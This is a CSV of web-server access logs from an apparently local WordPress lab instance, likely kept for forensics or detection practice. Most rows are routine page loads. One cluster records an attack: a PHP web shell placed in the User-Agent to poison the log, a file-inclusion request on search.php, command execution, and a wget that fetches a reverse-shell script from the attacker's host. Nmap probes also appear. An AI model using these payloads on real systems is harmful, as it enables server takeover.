timestamp,sourceIP,HTTP_method,page,referrer,response_code,response_size,user-agent
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/core.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,7258,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:32:07,172.18.1.1,GET,/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,1427,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:47,172.18.1.1,POST,/wp-login.php,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",302,1123,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:33,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
25/Oct/2022:14:30:32,127.0.0.1,OPTIONS,*,"""-""",200,126,"Apache/2.4.52 (Ubuntu) (internal dummy connection)"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/js/user-profile.min.js?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,2669,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/underscore.min.js?ver=1.13.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,7657,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/wp-util.min.js?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,1047,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/jquery/jquery.min.js?ver=3.6.0,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,31255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/images/wordpress-logo.svg?ver=20131107,"""http://localhost:8080/wp-admin/css/login.min.css?ver=6.0.3""",200,1810,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/js/password-strength-meter.min.js?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,963,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:25,172.18.1.1,GET,/wp-includes/js/zxcvbn.min.js,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,400393,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/css/dashicons.min.css?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,36068,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/css/l10n.min.css?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,1022,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/css/forms.min.css?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,6564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/css/login.min.css?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,2495,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/dist/hooks.min.js?ver=c6d64f2cb8f5c6bb49caca37f8828ce3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,2005,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.9,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,2801,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,7439,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/dist/i18n.min.js?ver=ebee46757c6a411e38fd079a7ac71d94,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,4209,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,4513,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/js/zxcvbn-async.min.js?ver=1.0,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,598,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin,"""-""",301,584,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-admin/,"""-""",302,435,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1,"""-""",200,4277,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:24,172.18.1.1,GET,/wp-includes/css/buttons.min.css?ver=6.0.3,"""http://localhost:8080/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%3A8080%2Fwp-admin%2F&reauth=1""",200,1791,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:12,172.18.1.1,GET,/,"""-""",200,9869,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/wp-content/themes/twentytwentytwo/style.css?ver=1.2,"""http://localhost:8080/""",200,2339,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/wp-content/themes/twentytwentytwo/assets/images/flight-path-on-transparent-d.png,"""http://localhost:8080/""",304,251,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/wp-includes/blocks/navigation/view.min.js?ver=009e29110e016c14bac4ba0ecc809fcd,"""http://localhost:8080/""",200,3160,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/wp-includes/blocks/navigation/style.min.css?ver=6.0.3,"""http://localhost:8080/""",200,2332,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/favicon.ico,"""http://localhost:8080/""",404,489,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/wp-includes/js/wp-emoji-release.min.js?ver=6.0.3,"""http://localhost:8080/""",200,5353,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:13,172.18.1.1,GET,/wp-content/themes/twentytwentytwo/assets/fonts/source-serif-pro/SourceSerif4Variable-Roman.ttf.woff2,"""http://localhost:8080/""",304,250,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:14,172.18.1.1,GET,/,"""http://localhost:8080/""",200,9868,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:16,172.18.1.1,GET,/,"""http://localhost:8080/""",200,9868,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:30:16,172.18.1.1,GET,/?page_id=2,"""http://localhost:8080/""",200,10563,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
25/Oct/2022:14:17:58,10.0.0.3,GET,/HNAP1,"""-""",404,456,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"""
25/Oct/2022:14:17:57,10.0.0.3,GET,/,"""-""",200,31161,"-"""
25/Oct/2022:14:17:58,10.0.0.3,GET,/,"""-""",200,55972,"-"""
25/Oct/2022:14:17:58,10.0.0.3,GET,/,"""-""",301,225,"-"""
25/Oct/2022:14:17:58,10.0.0.3,GET,/nmaplowercheck1666707476,"""-""",404,456,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"""
25/Oct/2022:14:17:58,10.0.0.3,POST,/sdk,"""-""",404,456,"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"""
25/Oct/2022:14:13:49,10.0.0.3,GET,/search.php?file=/var/log/apache2/access.log,"""-""",200,28529,"<?php system($_GET['c']);?>"""
25/Oct/2022:14:13:42,10.0.0.3,GET,/,"""-""",200,56018,"curl/7.58.0"""
25/Oct/2022:14:13:30,10.0.0.3,GET,/search.php?file=/var/log/apache2/access.log,"""-""",200,28529,"<?php system($_GET['c']);?>"""
25/Oct/2022:14:10:13,10.0.0.3,GET,/search.php?file=/var/log/apache2/access.log&c=wget%2010.0.0.3/php-reverse-shell.php,"""-""",200,28412,"curl/7.58.0"""
25/Oct/2022:14:10:13,10.0.0.3,GET,/search.php?file=/var/log/apache2/access.log&c=id,"""-""",200,28412,"curl/7.58.0"""
25/Oct/2022:14:10:13,10.0.0.3,GET,/search.php?file=/var/log/apache2/access.log,"""-""",200,28412,"<?php system($_GET['c']);?>"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/wp-ajax-response.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1406,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/jquery.color.min.js?ver=2.2.0,"""http://localhost:8080/wp-admin/""",200,3248,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/wp-lists.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2874,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/jquery.query.js?ver=2.2.3,"""http://localhost:8080/wp-admin/""",200,1970,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/quicktags.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,3854,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/edit-comments.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,5451,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/ui/core.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,7258,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,1427,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,6906,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/postbox.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2564,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/dashboard.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,3406,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/dist/vendor/moment.min.js?ver=2.29.4,"""http://localhost:8080/wp-admin/""",200,18869,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/plugin-install.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1364,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/wp-sanitize.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,626,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/thickbox/thickbox.js?ver=3.1-20121105,"""http://localhost:8080/wp-admin/""",200,4345,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/updates.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,9413,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/dist/date.min.js?ver=e923a564a0407e0c2ffcbd348817ca86,"""http://localhost:8080/wp-admin/""",200,33285,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/shortcode.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1487,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/media-upload.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,954,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/js/svg-painter.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2469,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/wp-auth-check.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,1115,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/heartbeat.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,2368,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/wplink.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,4226,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/ui/menu.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,3368,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.13.1,"""http://localhost:8080/wp-admin/""",200,3238,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/wp-emoji-release.min.js?ver=6.0.3,"""http://localhost:8080/wp-admin/""",200,5353,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/admin-ajax.php?action=wp-compression-test&test=1&_ajax_nonce=ace4038773&1666182028577,"""http://localhost:8080/wp-admin/""",200,1066,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-includes/js/thickbox/loadingAnimation.gif,"""http://localhost:8080/wp-admin/""",200,15525,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/admin-ajax.php?action=wp-compression-test&test=no&_ajax_nonce=ace4038773&1666182028656,"""http://localhost:8080/wp-admin/""",200,444,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
19/Oct/2022:12:20:28,172.17.0.1,GET,/wp-admin/admin-ajax.php?action=dashboard-widgets&widget=dashboard_primary&pagenow=dashboard,"""http://localhost:8080/wp-admin/""",200,594,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"""
